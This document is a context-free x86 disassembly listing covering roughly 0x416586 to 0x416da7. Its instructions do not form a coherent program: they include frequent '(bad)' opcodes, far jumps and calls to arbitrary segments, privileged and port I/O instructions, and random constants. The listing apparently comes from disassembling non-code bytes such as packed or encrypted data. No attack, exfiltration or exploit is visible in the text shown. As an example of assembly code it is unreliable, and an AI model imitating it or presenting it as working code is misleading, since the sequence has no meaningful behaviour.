  416586:	fdivr  DWORD PTR [edi]
  416588:	and    BYTE PTR [ecx-0x4acfe1c4],al
  41658e:	in     al,dx
  41658f:	pop    ss
  416590:	and    eax,0x4df1a947
  416595:	imul   edx,DWORD PTR [eax-0x7b01f424],0x1b35d71a
  41659f:	adc    dh,al
  4165a1:	mov    edx,DWORD PTR [edi]
  4165a3:	or     DWORD PTR [eax],0xd311c32b
  4165a9:	jbe    0x416533
  4165ab:	mov    ah,BYTE PTR [ebx]
  4165ad:	loope  0x41660b
  4165af:	fsub   QWORD PTR [esi+0x73]
  4165b2:	xchg   BYTE PTR ds:0xb44c0c24,cl
  4165b8:	call   0x62ea4979
  4165bd:	(bad)  
  4165be:	loopne 0x41659c
  4165c0:	pop    esp
  4165c1:	add    ch,BYTE PTR [edi+0x55]
  4165c4:	or     ebp,DWORD PTR [ebp-0x6955245a]
  4165ca:	stc    
  4165cb:	shr    BYTE PTR [esi],cl
  4165cd:	(bad)  
  4165ce:	retf   
  4165cf:	push   cs
  4165d0:	fcmovu st,st(1)
  4165d2:	mov    ebx,0x909b475d
  4165d7:	ds jmp 0x3908:0xca1d8805
  4165df:	mov    bh,0xb7
  4165e1:	js     0x416628
  4165e3:	mov    es,WORD PTR ds:0xfd45ddc5
  4165e9:	ss aad 0x71
  4165ec:	shl    BYTE PTR [eax-0x59],cl
  4165ef:	ins    DWORD PTR es:[edi],dx
  4165f0:	sub    eax,ecx
  4165f2:	daa    
  4165f3:	aaa    
  4165f4:	(bad)  
  4165f5:	fisttp QWORD PTR [edx+ebp*4+0x78]
  4165f9:	jecxz  0x41657d
  4165fb:	aam    0x9a
  4165fd:	push   ecx
  4165fe:	imul   esp,DWORD PTR [ebp+0x15],0x3147a1b
  416605:	pop    esp
  416606:	stos   BYTE PTR es:[edi],al
  416607:	dec    eax
  416608:	mov    ds:0x8506be47,eax
  41660d:	adc    bh,BYTE PTR [ebx-0x341d1f29]
  416613:	push   edx
  416614:	adc    DWORD PTR [edx+0x73eaea9a],ebx
  41661a:	adc    al,0xfe
  41661c:	cmp    BYTE PTR [edi],bl
  41661e:	lods   al,BYTE PTR ds:[esi]
  41661f:	rcl    ebx,cl
  416621:	dec    esi
  416622:	mov    ds:0xd0eee286,eax
  416627:	call   0x593a:0x7bd3e87d
  41662e:	or     al,0x39
  416630:	rol    DWORD PTR ss:[eax+0x7e],0x85
  416635:	(bad)  
  416636:	jp     0x4165ce
  416638:	test   al,0x70
  41663a:	mov    ebx,0x923f47f1
  41663f:	in     al,dx
  416640:	(bad)  
  416642:	pop    esp
  416643:	push   edi
  416644:	mov    bl,0x31
  416646:	sahf   
  416647:	test   eax,0x9564440
  41664c:	push   ebx
  41664d:	stos   DWORD PTR es:[edi],eax
  41664e:	sub    eax,0x35e2815a
  416653:	ficom  DWORD PTR [edi+0xb]
  416656:	mov    edx,DWORD PTR [ebp-0xfd6a2f0]
  41665c:	add    eax,0x5e6216da
  416661:	ficom  WORD PTR [eax+0x48523f18]
  416667:	sbb    BYTE PTR [ebx-0x69],0x7
  41666b:	add    BYTE PTR [ebx],dl
  41666d:	fdivr  st(6),st
  41666f:	repz adc eax,0xf0c8291
  416675:	jle    0x41665d
  416677:	inc    edi
  416678:	inc    ebx
  416679:	push   cs
  41667a:	imul   ecx,DWORD PTR [ecx],0xffffffd9
  41667d:	(bad)  
  41667e:	imul   cx,WORD PTR [edi-0x62],0xff9a
  416683:	aas    
  416684:	adc    bh,ch
  416686:	mov    eax,ds:0x499f1f84
  41668b:	mul    BYTE PTR [ecx+ecx*1+0x46]
  41668f:	or     BYTE PTR [esi],ah
  416691:	jle    0x41661c
  416693:	sbb    al,0xcc
  416695:	loop   0x4166ba
  416697:	push   0x10
  416699:	out    dx,eax
  41669a:	mov    ebp,DWORD PTR [ecx+0x2a3c2b19]
  4166a0:	hlt    
  4166a1:	daa    
  4166a2:	mov    DWORD PTR [eax-0x34],ebx
  4166a5:	pop    eax
  4166a6:	dec    ebx
  4166a7:	dec    eax
  4166a8:	es ss cdq 
  4166ab:	adc    esp,eax
  4166ad:	adc    BYTE PTR [eax+0xef71fc9],0xeb
  4166b4:	jno    0x416724
  4166b6:	xchg   esi,eax
  4166b7:	sbb    esi,ebp
  4166b9:	or     dl,ah
  4166bb:	(bad)  
  4166bc:	rcl    BYTE PTR [eax-0x9],cl
  4166bf:	or     BYTE PTR [ebp-0x67],bh
  4166c2:	sbb    al,0xbc
  4166c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166c5:	cmp    DWORD PTR [esi+0x54],0x54b521f3
  4166cc:	push   ecx
  4166cd:	jno    0x416672
  4166cf:	sbb    DWORD PTR [ecx],0xffffffcb
  4166d2:	shl    DWORD PTR [eax+0x474fe01c],1
  4166d8:	test   eax,0x9d0917f5
  4166dd:	jne    0x41672b
  4166df:	test   eax,0xb5acf9af
  4166e4:	(bad)  
  4166e5:	adc    ch,BYTE PTR [edx]
  4166e7:	jmp    0x416748
  4166e9:	adc    ebp,esi
  4166eb:	pop    ecx
  4166ec:	add    eax,0xef8c1784
  4166f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f2:	and    DWORD PTR [ecx],0xffffffdd
  4166f5:	mov    ecx,0x3c4abf36
  4166fa:	mov    WORD PTR [ebp-0x44],?
  4166fd:	and    eax,0xe81609a3
  416702:	xchg   BYTE PTR [edi],bh
  416704:	mov    esi,0x8f14847f
  416709:	test   al,0x24
  41670b:	pop    edi
  41670c:	push   ds
  41670d:	dec    ebx
  41670e:	es ret 0x2722
  416712:	pop    eax
  416713:	cmp    DWORD PTR [esi],0x19d0b8e9
  416719:	adc    ebp,edx
  41671b:	or     DWORD PTR [edi-0x9],ebp
  41671e:	adc    BYTE PTR [ebp+0x4ba5b0ec],cl
  416724:	mov    esp,0x1ab903a
  416729:	test   eax,0x243e9572
  41672e:	sbb    cl,BYTE PTR ds:0x777fa292
  416734:	add    eax,DWORD PTR [ecx]
  416736:	adc    esp,DWORD PTR [esi-0x4d]
  416739:	retf   0xf701
  41673c:	mov    edi,0xa39c5de3
  416741:	or     BYTE PTR [ebx-0x6b],0x35
  416745:	mov    ebp,0xc52c9976
  41674a:	inc    ebp
  41674b:	sar    DWORD PTR [eax+0x2f71fdc3],cl
  416751:	loopne 0x416759
  416753:	je     0x4166f9
  416755:	lds    eax,FWORD PTR [ebx]
  416757:	leave  
  416758:	jle    0x41678b
  41675a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41675b:	arpl   WORD PTR [si],bx
  41675e:	test   al,0xdc
  416760:	jge    0x4167b6
  416762:	add    sp,WORD PTR [edx+0x7d]
  416766:	call   0x7004ae31
  41676b:	jp     0x41675a
  41676d:	cmp    ah,dh
  41676f:	xor    BYTE PTR [ebp+0x74fa5d4d],0x3b
  416776:	xchg   ebp,eax
  416777:	das    
  416778:	scas   al,BYTE PTR es:[edi]
  416779:	adc    bl,al
  41677b:	inc    esi
  41677c:	fnsave [ebp-0x3afba070]
  416782:	pop    edx
  416783:	mov    dh,0xa0
  416785:	xlat   BYTE PTR ds:[ebx]
  416786:	(bad)  
  416787:	and    DWORD PTR [ebp-0x56],eax
  41678a:	pop    es
  41678b:	dec    ebx
  41678c:	dec    edi
  41678d:	lods   eax,DWORD PTR ds:[esi]
  41678e:	loope  0x416761
  416790:	stc    
  416791:	loopne 0x416789
  416793:	dec    eax
  416794:	ss dec ecx
  416796:	jbe    0x4167df
  416798:	lahf   
  416799:	cwde   
  41679a:	or     al,0x22
  41679c:	xor    ebx,DWORD PTR [ecx-0x1fc60cae]
  4167a2:	mov    edi,0x164481fd
  4167a7:	outs   dx,BYTE PTR ds:[esi]
  4167a8:	sbb    eax,0xdfe24480
  4167ad:	ret    0xbf5e
  4167b0:	fiadd  WORD PTR [eax]
  4167b2:	push   0xffffffb1
  4167b4:	lods   eax,DWORD PTR ds:[esi]
  4167b5:	leave  
  4167b6:	cwde   
  4167b7:	sub    eax,0x4d8cd0
  4167bc:	loop   0x416740
  4167be:	or     DWORD PTR [eax+0x3b765971],0xe69e6014
  4167c8:	arpl   di,sp
  4167ca:	and    eax,0x36b84949
  4167cf:	(bad)  
  4167d0:	(bad)  
  4167d1:	dec    esp
  4167d2:	inc    ebp
  4167d3:	fistp  DWORD PTR gs:[esi]
  4167d6:	push   esp
  4167d7:	cwde   
  4167d8:	jbe    0x4167be
  4167da:	je     0x41681d
  4167dc:	or     DWORD PTR [eax-0x6d14ff29],ebx
  4167e2:	(bad)  
  4167e3:	or     BYTE PTR [ebp+0x65],cl
  4167e6:	xchg   edx,eax
  4167e7:	aaa    
  4167e8:	add    BYTE PTR [esi+0x64c20731],dl
  4167ee:	pop    ecx
  4167ef:	mov    ecx,0x2f76b76b
  4167f4:	rcl    DWORD PTR [ebp+0xe6af69d],1
  4167fa:	mov    dl,0x73
  4167fc:	das    
  4167fd:	lds    esp,FWORD PTR [esp+esi*4]
  416800:	nop
  416801:	cdq    
  416802:	lea    ebx,[ecx+0x61]
  416805:	je     0x4167b7
  416807:	(bad)  
  416808:	jmp    0xf23c:0xc989dfca
  41680f:	xchg   ecx,eax
  416810:	dec    eax
  416811:	mov    esi,0x5bca4c52
  416816:	xchg   edx,eax
  416817:	mov    ds:0x9acea6fc,eax
  41681c:	lods   eax,DWORD PTR ds:[esi]
  41681d:	pusha  
  41681e:	clc    
  41681f:	sub    BYTE PTR [eax+0x2c4fecdd],al
  416825:	fist   DWORD PTR [edx+0xe2b2593]
  41682b:	xor    eax,0x1ac7f394
  416830:	add    esp,ecx
  416832:	sub    al,0xcd
  416834:	mov    ds:0x90eb3a02,eax
  416839:	call   0x32f4:0x71a7439b
  416840:	clc    
  416841:	popf   
  416842:	nop
  416843:	aas    
  416844:	imul   ebp,esp,0xa789c17b
  41684a:	cld    
  41684b:	(bad)  
  41684c:	(bad)  [edi]
  41684e:	stos   DWORD PTR es:[edi],eax
  41684f:	rol    BYTE PTR [edx+0x236b769b],0x12
  416856:	jmp    0xaa82b3f9
  41685b:	repnz mov bl,0x19
  41685e:	add    al,0x56
  416860:	mov    ebx,0x1672dc6f
  416865:	jo     0x4168b6
  416867:	adc    dh,bl
  416869:	pop    ebx
  41686a:	jno    0x4168ab
  41686c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41686d:	aas    
  41686e:	mov    eax,0x7d5c4d11
  416874:	mov    gs,WORD PTR [esi-0x2506da1a]
  41687a:	clc    
  41687b:	cmp    bl,BYTE PTR [ebp+0x7c]
  41687e:	sbb    DWORD PTR [eax+0x1def335b],eax
  416884:	and    ch,BYTE PTR [edi-0x425ac2ab]
  41688a:	call   0xba341b1a
  41688f:	lods   al,BYTE PTR ds:[esi]
  416890:	aad    0x42
  416892:	or     ecx,DWORD PTR [edi+0x27]
  416895:	xor    DWORD PTR [edi],ebx
  416897:	xchg   esi,eax
  416898:	sub    ah,BYTE PTR [eax-0x74cd4197]
  41689e:	mov    esi,DWORD PTR [eax+0x3b65d242]
  4168a4:	outs   dx,DWORD PTR ds:[esi]
  4168a5:	push   0x21d3e3ed
  4168aa:	lds    edi,FWORD PTR [eax]
  4168ac:	xchg   esi,eax
  4168ad:	mov    bh,0x81
  4168af:	xor    esi,DWORD PTR [edi+ebx*8]
  4168b2:	out    0x15,eax
  4168b4:	icebp  
  4168b5:	data16 stc 
  4168b7:	jl     0x416840
  4168b9:	jnp    0x4168f2
  4168bb:	xor    al,0xe2
  4168bd:	sub    edx,ebp
  4168bf:	js     0x41690e
  4168c1:	push   ebx
  4168c2:	jnp    0x4168fb
  4168c4:	push   ecx
  4168c5:	push   eax
  4168c6:	or     al,0x21
  4168c8:	sahf   
  4168c9:	es mov ebx,0xbdce6a88
  4168cf:	xchg   BYTE PTR [ecx+0x475262e],cl
  4168d5:	cmp    eax,0x7ce519a2
  4168da:	inc    BYTE PTR [edi]
  4168dc:	jb     0x4168d5
  4168de:	cmp    eax,0x9ee9ff39
  4168e3:	pop    ss
  4168e4:	rcr    DWORD PTR [ebp-0x4e],1
  4168e7:	sbb    BYTE PTR [ebx],bl
  4168e9:	jecxz  0x416878
  4168eb:	ficom  DWORD PTR [ebx-0x6694fde7]
  4168f1:	ret    0x654d
  4168f4:	pop    ss
  4168f5:	push   esp
  4168f6:	fsubr  DWORD PTR ds:0x84d79ebe
  4168fc:	xchg   ebp,eax
  4168fd:	int    0xa1
  4168ff:	popa   
  416900:	jns    0x41693d
  416902:	call   0xca67:0x18ccb15a
  416909:	in     al,0x21
  41690b:	ja     0x416987
  41690d:	fldcw  WORD PTR [esi]
  41690f:	cmp    DWORD PTR [eax],edx
  416911:	xchg   DWORD PTR [esi-0x6eb40cbe],edx
  416917:	xor    al,0x43
  416919:	fsub   QWORD PTR fs:[ebp+0x456a6b61]
  416920:	clc    
  416921:	(bad)  
  416922:	sub    eax,0xedf2c1a1
  416927:	jnp    0x416916
  416929:	jbe    0x4169a6
  41692b:	jbe    0x416937
  41692d:	mov    bl,0x3e
  41692f:	int3   
  416930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416931:	js     0x416986
  416933:	push   0x7b2b08c9
  416938:	xchg   edx,eax
  416939:	add    DWORD PTR [edi+0x506ac598],ebx
  41693f:	aam    0x4d
  416941:	mov    BYTE PTR [ecx+0x70437d8b],cl
  416947:	fstp   TBYTE PTR [esi+0x46]
  41694a:	hlt    
  41694b:	and    al,0x80
  41694d:	inc    ebx
  41694e:	sub    DWORD PTR [ecx-0x45f95a63],0xc893f20f
  416958:	sbb    eax,0xc845bb9d
  41695d:	jns    0x41690a
  41695f:	loop   0x416997
  416961:	out    0x47,al
  416963:	test   DWORD PTR [ebx+ebp*1],ebp
  416966:	xchg   DWORD PTR [ebp-0x42cff89b],esp
  41696c:	aad    0x74
  41696e:	stc    
  41696f:	mov    ebp,0xc5eaa101
  416974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416975:	lods   eax,DWORD PTR ds:[esi]
  416976:	fs push edx
  416978:	test   cl,0xf1
  41697b:	in     al,0xfb
  41697d:	xor    ecx,DWORD PTR [si]
  416980:	push   edx
  416981:	jns    0x4169bd
  416983:	sti    
  416984:	std    
  416985:	cmp    DWORD PTR [ebx-0x1023a03c],ebx
  41698b:	adc    eax,0x5ccc36f1
  416990:	xchg   DWORD PTR ds:0x47b59c27,ecx
  416996:	clc    
  416997:	add    edi,esi
  416999:	jp     0x416971
  41699b:	dec    ecx
  41699c:	repnz sub eax,0xf41f406
  4169a2:	loope  0x41699e
  4169a4:	xchg   ecx,eax
  4169a5:	into   
  4169a6:	adc    al,0x11
  4169a8:	push   ebp
  4169a9:	jg     0x416973
  4169ab:	loop   0x416985
  4169ad:	aam    0x72
  4169af:	iret   
  4169b0:	pop    ebx
  4169b1:	dec    eax
  4169b2:	leave  
  4169b3:	clc    
  4169b4:	daa    
  4169b5:	repnz sbb al,0x46
  4169b8:	adc    BYTE PTR [esi+0x9a3c419],dl
  4169be:	add    bl,BYTE PTR [edx-0x80]
  4169c1:	addr16 int3 
  4169c3:	sub    al,0x4e
  4169c5:	dec    esi
  4169c6:	lods   al,BYTE PTR ds:[esi]
  4169c7:	and    dl,bl
  4169c9:	bound  esi,QWORD PTR [ebp-0x1ed6408a]
  4169cf:	xchg   ecx,eax
  4169d0:	dec    esi
  4169d1:	fldenv [ebp-0x6f]
  4169d4:	mov    edx,0x5d900f61
  4169d9:	jae    0x41696d
  4169db:	inc    ebp
  4169dc:	dec    edx
  4169dd:	das    
  4169de:	pop    edx
  4169df:	or     eax,0x5742cb1
  4169e4:	in     al,dx
  4169e5:	dec    esi
  4169e6:	mov    bl,0xdb
  4169e8:	lock mov bl,bh
  4169eb:	inc    DWORD PTR [esi-0x5f]
  4169ee:	xor    bl,0xce
  4169f1:	getsec 
  4169f3:	clc    
  4169f4:	or     al,0xb0
  4169f6:	cdq    
  4169f7:	imul   edx,DWORD PTR [edi],0x32ebd02c
  4169fd:	arpl   WORD PTR [ebx+0x246d8112],sp
  416a03:	push   ebx
  416a04:	loopne 0x4169db
  416a06:	in     eax,0x13
  416a08:	dec    edi
  416a09:	xchg   esi,eax
  416a0a:	inc    ecx
  416a0b:	xor    eax,0x8f708e91
  416a10:	in     eax,dx
  416a11:	repz sub DWORD PTR [ebp+0x2a],ecx
  416a15:	or     eax,0x90b331b5
  416a1a:	out    dx,al
  416a1b:	mov    ds:0x6ba785ce,al
  416a20:	push   0x3
  416a22:	ss pop ss
  416a24:	push   edx
  416a25:	retf   0xfcc8
  416a28:	inc    al
  416a2a:	jne    0x416a01
  416a2c:	cdq    
  416a2d:	push   esi
  416a2e:	jp     0x4169f7
  416a30:	mov    edi,DWORD PTR [ecx+0x19]
  416a33:	or     al,0xa3
  416a35:	sbb    eax,0x3fc281e9
  416a3a:	xchg   ecx,eax
  416a3b:	arpl   cx,bx
  416a3d:	jg     0x416a8f
  416a3f:	adc    bh,BYTE PTR [ebp-0x52]
  416a42:	scas   al,BYTE PTR es:[edi]
  416a43:	jge    0x416a2d
  416a45:	cmp    ch,BYTE PTR [edx-0x77868c8a]
  416a4b:	and    DWORD PTR [edx],ebp
  416a4d:	bound  esi,QWORD PTR [ebx-0x68]
  416a50:	in     al,0xe5
  416a52:	xor    DWORD PTR [ebx],ebp
  416a54:	xchg   dl,bl
  416a56:	mov    ebp,0x873f2839
  416a5b:	arpl   dx,ax
  416a5d:	stos   DWORD PTR es:[edi],eax
  416a5e:	push   esi
  416a5f:	mov    edx,0xcdb06d27
  416a64:	jle    0x416ab5
  416a66:	push   eax
  416a67:	nop
  416a68:	or     al,0xff
  416a6a:	cmc    
  416a6b:	std    
  416a6c:	pop    esp
  416a6d:	adc    al,0xf4
  416a6f:	test   eax,0x1ed77ddf
  416a74:	mul    BYTE PTR [ebx-0x380e42cf]
  416a7a:	jb     0x416a90
  416a7c:	mov    ds:0x414daa14,al
  416a81:	jne    0x416ad9
  416a83:	les    eax,FWORD PTR [ecx+0x34]
  416a86:	or     BYTE PTR [ebp-0x14],bl
  416a89:	dec    eax
  416a8a:	cmp    eax,0xf69a65bc
  416a8f:	cdq    
  416a90:	sbb    ah,cl
  416a92:	inc    edx
  416a93:	push   0x816cb444
  416a98:	call   0x34c6:0xbc9c078a
  416a9f:	push   ss
  416aa0:	test   BYTE PTR [ebp+0x25],ch
  416aa3:	add    BYTE PTR [ebx+0x13],0xd0
  416aa7:	sub    BYTE PTR [esi],al
  416aa9:	add    eax,0xf269b084
  416aae:	add    DWORD PTR [eax],esi
  416ab0:	jae    0x416ae4
  416ab2:	sbb    eax,0x85165e40
  416ab7:	or     eax,0x33392426
  416abc:	cmp    dl,BYTE PTR [ecx+0x2f154277]
  416ac2:	enter  0xc624,0xb9
  416ac6:	dec    eax
  416ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac8:	mov    al,ds:0x3ce09109
  416acd:	cld    
  416ace:	iret   
  416acf:	mov    ecx,0x25be5674
  416ad4:	pop    es
  416ad5:	cli    
  416ad6:	mov    ds:0x56c6ce22,al
  416adb:	loop   0x416b12
  416add:	pop    eax
  416ade:	mov    al,ds:0x106def37
  416ae3:	xchg   esi,eax
  416ae4:	sub    DWORD PTR [edi+0x2b],0xffffffd6
  416ae8:	arpl   WORD PTR [edi-0x6a6254f1],sp
  416aee:	nop
  416aef:	mov    edx,DWORD PTR [edi-0x24]
  416af2:	and    ebx,DWORD PTR [ecx+0x70]
  416af5:	aad    0x4d
  416af7:	pop    ecx
  416af8:	and    al,cl
  416afa:	mov    bl,0x95
  416afc:	push   esi
  416afd:	call   DWORD PTR [ebp-0x69]
  416b00:	dec    esp
  416b01:	retf   
  416b02:	xor    eax,0x138c36b8
  416b07:	jmp    0x2a31:0x667d787e
  416b0e:	dec    esp
  416b0f:	popa   
  416b10:	mov    eax,0x2b633a7f
  416b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b16:	xchg   esi,eax
  416b17:	fdivp  st(2),st
  416b19:	jmp    0x484e:0x99cccf3b
  416b20:	mov    ds:0x4f95c307,al
  416b25:	xchg   ebp,eax
  416b26:	push   0xffffffa9
  416b28:	or     eax,0xc689536b
  416b2d:	aam    0x3f
  416b2f:	adc    edi,DWORD PTR [edx]
  416b31:	push   edx
  416b32:	or     ebp,ecx
  416b34:	xor    bh,BYTE PTR ds:0x6e9b2181
  416b3a:	xor    al,0xd2
  416b3c:	jmp    0xaa99cc74
  416b41:	jge    0x416ba9
  416b43:	jne    0x416b03
  416b45:	je     0x416b1d
  416b47:	and    DWORD PTR [ebx],esi
  416b49:	jle    0x416b81
  416b4b:	test   DWORD PTR ds:0x9c83743a,edx
  416b51:	jbe    0x416bab
  416b53:	mov    ch,0x71
  416b55:	dec    eax
  416b56:	jne    0x416adc
  416b58:	scas   al,BYTE PTR es:[edi]
  416b59:	mov    BYTE PTR [esi+0x428e8bcc],al
  416b5f:	and    ah,dh
  416b61:	pushf  
  416b62:	or     al,BYTE PTR [edi-0x41]
  416b65:	push   edx
  416b66:	sahf   
  416b67:	(bad)  [ebx]
  416b69:	dec    esi
  416b6a:	add    edi,esi
  416b6c:	ret    0x7f36
  416b6f:	jbe    0x416b20
  416b71:	data16 daa 
  416b73:	test   al,0xbb
  416b75:	dec    eax
  416b76:	and    eax,0x2bd21447
  416b7b:	jge    0x416b48
  416b7d:	add    DWORD PTR [eax+ebx*4-0x8],esi
  416b81:	jle    0x416bc6
  416b83:	jnp    0x416b9a
  416b85:	mov    WORD PTR [edx+0x5d],es
  416b88:	xchg   ecx,eax
  416b89:	std    
  416b8a:	pandn  mm5,QWORD PTR [ecx]
  416b8d:	and    al,0x5e
  416b8f:	aaa    
  416b90:	xor    ecx,esp
  416b92:	and    DWORD PTR [esi-0x62be1452],edi
  416b98:	lods   eax,DWORD PTR ds:[esi]
  416b99:	pop    edi
  416b9a:	mov    eax,0xb8b2be40
  416b9f:	jo     0x416b88
  416ba1:	bound  edi,QWORD PTR [ecx-0x71]
  416ba4:	lock mov dl,BYTE PTR [ebx+0x7f]
  416ba8:	sub    al,0x8
  416baa:	call   0x8371:0x2a024d40
  416bb1:	leave  
  416bb2:	jge    0x416b44
  416bb4:	sti    
  416bb5:	(bad)  
  416bb6:	jge    0x416be0
  416bb8:	mov    edi,0xdf8280ba
  416bbd:	add    ebx,0x5b
  416bc0:	in     eax,0x1a
  416bc2:	lods   al,BYTE PTR ds:[esi]
  416bc3:	jns    0x416b77
  416bc5:	adc    ecx,DWORD PTR [ebx+0x5a]
  416bc8:	(bad)  
  416bc9:	push   ss
  416bca:	jecxz  0x416bc4
  416bcc:	add    bh,BYTE PTR [ebp+eax*2+0x75db1031]
  416bd3:	(bad)  
  416bd4:	cld    
  416bd5:	jnp    0x416c3c
  416bd7:	bound  esi,QWORD PTR [ecx+0x30]
  416bda:	js     0x416c10
  416bdc:	lock ror esi,cl
  416bdf:	loop   0x416c25
  416be1:	mov    BYTE PTR [edi+0x17],al
  416be4:	push   0xffffffee
  416be6:	in     al,dx
  416be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416be8:	mov    ds:0x2b4e5ead,al
  416bed:	cmp    DWORD PTR [edi-0x72a6131b],edx
  416bf3:	mov    ebp,0x75d201bf
  416bf8:	xchg   esp,eax
  416bf9:	adc    al,0xe0
  416bfb:	das    
  416bfc:	or     edi,DWORD PTR [eax+0x79]
  416bff:	sub    eax,0x7e9ba80d
  416c04:	test   BYTE PTR [ecx-0x40],0x3f
  416c08:	mov    eax,DWORD PTR [edi]
  416c0a:	mov    ds:0x99b2a594,al
  416c0f:	jb     0x416bd8
  416c11:	shr    bl,cl
  416c13:	shr    DWORD PTR [ebx],1
  416c15:	fld    DWORD PTR [edx]
  416c17:	jmp    ecx
  416c19:	add    eax,0x909c9545
  416c1e:	pop    eax
  416c1f:	cld    
  416c20:	popa   
  416c21:	popa   
  416c22:	cmp    ebp,DWORD PTR [edi+0x1e]
  416c25:	xor    ah,BYTE PTR [esi]
  416c27:	dec    esp
  416c28:	mov    ds:0xea56d204,al
  416c2d:	mov    BYTE PTR [edx-0x7f8bb4e4],ch
  416c33:	sub    BYTE PTR [edi],cl
  416c35:	lds    ebx,FWORD PTR [ecx+0x11]
  416c38:	call   0xcf23:0x4e677449
  416c3f:	scas   eax,DWORD PTR es:[edi]
  416c40:	scas   eax,DWORD PTR es:[edi]
  416c41:	mov    ah,0x15
  416c43:	ins    DWORD PTR es:[edi],dx
  416c44:	sub    BYTE PTR [eax+eax*2+0x3ee6a5c0],0xc4
  416c4c:	jnp    0x416c0d
  416c4e:	sti    
  416c4f:	mov    edx,DWORD PTR ds:0xf1cbf605
  416c55:	mov    ecx,0x7dd5bd8
  416c5a:	je     0x416bdc
  416c5c:	cld    
  416c5d:	adc    eax,0x62f61cc7
  416c62:	or     BYTE PTR [ebp+0x4fb0c176],ch
  416c68:	sub    BYTE PTR [ebp+0x30cfc977],0x22
  416c6f:	out    dx,eax
  416c70:	fld1   
  416c72:	add    ecx,eax
  416c74:	or     eax,0xc74eecdd
  416c79:	push   0x45
  416c7b:	mov    gs,WORD PTR [ecx-0x5e]
  416c7e:	data16 rep stos BYTE PTR es:[edi],al
  416c81:	data16 cld 
  416c83:	pusha  
  416c84:	lods   eax,DWORD PTR ds:[esi]
  416c85:	dec    dh
  416c87:	sti    
  416c88:	cmp    DWORD PTR [esi-0x407dc2b8],edi
  416c8e:	sbb    esp,eax
  416c90:	aas    
  416c91:	loope  0x416c84
  416c93:	test   BYTE PTR [ebp-0x47cef61e],bh
  416c99:	shr    edi,cl
  416c9b:	outs   dx,DWORD PTR ds:[esi]
  416c9c:	inc    edi
  416c9d:	jo     0x416c95
  416c9f:	inc    esp
  416ca0:	ins    BYTE PTR es:[edi],dx
  416ca1:	jg     0x416cd3
  416ca3:	call   0x1a5d:0xb1105b9c
  416caa:	out    dx,al
  416cab:	fmul   DWORD PTR [ebx]
  416cad:	pop    ss
  416cae:	sub    al,0xb5
  416cb0:	sub    DWORD PTR [edx+0x5c],ebx
  416cb3:	test   BYTE PTR [ebp-0x4d4c1cde],0x75
  416cba:	dec    esi
  416cbb:	xchg   edi,eax
  416cbc:	test   edx,0xabc256c8
  416cc2:	add    bl,BYTE PTR [edi+0x2c2dc485]
  416cc8:	rcr    BYTE PTR [esp+ebp*2-0x34],0xe9
  416ccd:	(bad)  
  416cce:	into   
  416ccf:	aad    0xbd
  416cd1:	add    ebp,0x57
  416cd4:	les    edi,FWORD PTR [ebx+0x7cebdf9e]
  416cda:	xor    DWORD PTR [ebx+0x41],ebp
  416cdd:	cmp    cx,WORD PTR [edx+0x9]
  416ce1:	shl    al,cl
  416ce3:	adc    bh,BYTE PTR [edx]
  416ce5:	int    0x8b
  416ce7:	daa    
  416ce8:	retf   
  416ce9:	pop    es
  416cea:	add    BYTE PTR [edx-0x33],bl
  416ced:	lock sub DWORD PTR [esi],0xffffffef
  416cf1:	test   BYTE PTR [ebx+0x231ac467],0x8c
  416cf8:	arpl   WORD PTR [eax+0x4f1b6683],bp
  416cfe:	popf   
  416cff:	pop    ds
  416d00:	rcr    dl,1
  416d02:	sbb    esp,esp
  416d04:	int3   
  416d05:	cld    
  416d06:	mov    cl,0xf7
  416d08:	and    al,0x65
  416d0a:	dec    ebx
  416d0b:	out    dx,eax
  416d0c:	pop    edx
  416d0d:	(bad)  
  416d0e:	fnstenv [esi-0x5f]
  416d11:	cdq    
  416d12:	mov    WORD PTR [ecx-0x2],?
  416d15:	and    eax,0xdadf7532
  416d1a:	retf   
  416d1b:	sbb    ebx,DWORD PTR [edi-0x57]
  416d1e:	test   BYTE PTR [edi],0xa6
  416d21:	fwait
  416d22:	rol    BYTE PTR [ebp-0x40539a7e],cl
  416d28:	or     ebx,DWORD PTR [eax]
  416d2a:	mov    edx,0x2e9a05fd
  416d2f:	outs   dx,DWORD PTR ds:[esi]
  416d30:	inc    esp
  416d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d32:	dec    ebp
  416d33:	cmp    bh,BYTE PTR [edx+0x3a]
  416d36:	ficom  DWORD PTR [ebx]
  416d38:	mov    ecx,0x67a3f61c
  416d3d:	push   es
  416d3e:	add    dh,bl
  416d40:	xchg   edx,eax
  416d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d42:	fsubr  st,st(1)
  416d44:	scas   eax,DWORD PTR es:[edi]
  416d45:	cs push eax
  416d47:	leave  
  416d48:	ja     0x416dc9
  416d4a:	mov    edi,0x8c4e2efd
  416d4f:	(bad)  
  416d50:	imul   eax,DWORD PTR [edi-0x4dac5798],0x7e73c941
  416d5a:	jl     0x416ced
  416d5c:	sbb    BYTE PTR [esi],0x31
  416d5f:	mov    BYTE PTR [edx-0x6c88b09c],dh
  416d65:	push   ebx
  416d66:	inc    ecx
  416d67:	add    al,0x2b
  416d69:	cli    
  416d6a:	add    eax,0x751b9563
  416d6f:	sub    bl,bl
  416d71:	or     BYTE PTR [esi+0x4294674d],al
  416d77:	cld    
  416d78:	pop    eax
  416d79:	dec    ebp
  416d7a:	stos   DWORD PTR es:[edi],eax
  416d7b:	and    eax,0x4e1c05a2
  416d80:	cdq    
  416d81:	jmp    0x594b:0xadbe7d12
  416d88:	push   edi
  416d89:	xor    al,0xdf
  416d8b:	outs   dx,BYTE PTR ds:[esi]
  416d8c:	arpl   WORD PTR [eax-0x11f62563],dx
  416d92:	adc    ebp,ebx
  416d94:	push   ds
  416d95:	(bad)  
  416d96:	call   0x93d9579c
  416d9b:	stc    
  416d9c:	jge    0x416e12
  416d9e:	ret    0xf32c
  416da1:	shl    DWORD PTR [ebp+0x55],0x87
  416da5:	jp     0x416e04
  416da7:	hlt    
